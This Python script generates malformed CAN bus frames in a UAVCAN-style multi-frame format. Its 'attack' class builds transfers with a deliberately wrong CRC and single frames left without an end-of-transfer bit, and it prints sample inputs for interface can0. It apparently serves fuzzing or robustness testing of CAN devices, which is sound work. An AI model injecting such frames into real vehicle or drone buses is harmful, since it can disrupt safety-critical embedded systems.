class CAN:
    def build(interface, can_id, payload, tail_byte):
        return f'{interface}  {can_id}   [{ len(payload.split(" ")) + 1 }]  {payload} {tail_byte}'


class CAN_ID:
    def __init__(self):
        pass


class CAN_PAYLOAD:
    def build(s, e, t, id):
        return f'{(s << 7) + (e << 6) + (t << 5) + id:02X}'


class attack:
    # send multiframe message with wrong CRC
    def wrong_CRC(self, CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
        payload = payload.split(' ')

        transfer_start  = 0b1
        transfer_end    = 0b0
        toggle          = 0b0
        transfer_ID     = 0b00000

        if len(payload) < 6:
            if padding: payload += ["00" for _ in range(5 - len(payload))]
            print(CAN.build(
                    'can0', 
                    10015501, 
                    f'{CRC} {" ".join(payload)}', 
                    CAN_PAYLOAD.build(
                        transfer_start, 
                        transfer_end, 
                        toggle, 
                        transfer_ID
                        )
                    )
                )
        else:
            print(CAN.build(
                    'can0', 
                    10015501, 
                    f'{CRC} {" ".join(payload[ : 5 ])}', 
                    CAN_PAYLOAD.build(
                        transfer_start, 
                        transfer_end, 
                        toggle, 
                        transfer_ID
                        )
                    )
                )
            payload = payload[ 5 : ]

            transfer_start  = 0b0
            while len(payload) > 7:
                toggle ^= 0b1
                print(CAN.build(
                        'can0',
                        10015501,
                        " ".join(payload[ : 7 ]), 
                        CAN_PAYLOAD.build(
                            transfer_start, 
                            transfer_end, 
                            toggle, 
                            transfer_ID
                            )
                        )
                    )

                payload = payload[ 7 : ]

            transfer_end = 0b1
            toggle ^= 0b1
            print(CAN.build(
                'can0', 
                10015501, 
                " ".join(payload), 
                CAN_PAYLOAD.build(
                    transfer_start, 
                    transfer_end, 
                    toggle, 
                    transfer_ID
                    )
                )
            )

        print()

    def wrong_CRC_test(self):
        print("''' wrong CRC attack sample input '''")
        self.wrong_CRC('A1 A2', 'C1', False)    
        self.wrong_CRC('A1 A2', 'C1 C2')
        self.wrong_CRC('A1 A2', 'C1 C2 C3')
        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4')
        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4 C5')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6')
        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0')
        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0 B0')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B5 B5 B6 B7 B8 B9 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0')

    # send singleframe message with open end
    def wrong_END(self, payload = 'BB BB BB BB', padding = True):
        payload = payload.split(' ')

        transfer_start  = 0b1
        transfer_end    = 0b0
        toggle          = 0b0
        transfer_ID     = 0b00000

        if padding: payload += ["00" for _ in range(7 - len(payload))]
        print(CAN.build(
                'can0', 
                10015501, 
                f'{" ".join(payload)}', 
                CAN_PAYLOAD.build(
                    transfer_start, 
                    transfer_end, 
                    toggle, 
                    transfer_ID
                    )
                )
            )

    def wrong_END_test(self):
        print("''' wrong end attack sample input '''")
        self.wrong_END('C1', False)    
        self.wrong_END('C1 C2')
        self.wrong_END('C1 C2 C3')
        self.wrong_END('C1 C2 C3 C4')
        self.wrong_END('C1 C2 C3 C4 C5')

        self.wrong_END('B1 B2 B3 B4 B5 B6')
        self.wrong_END('B1 B2 B3 B4 B5 B6 B7')


def main():
    attack().wrong_CRC_test()
    attack().wrong_END_test()


if __name__ == "__main__":
    main()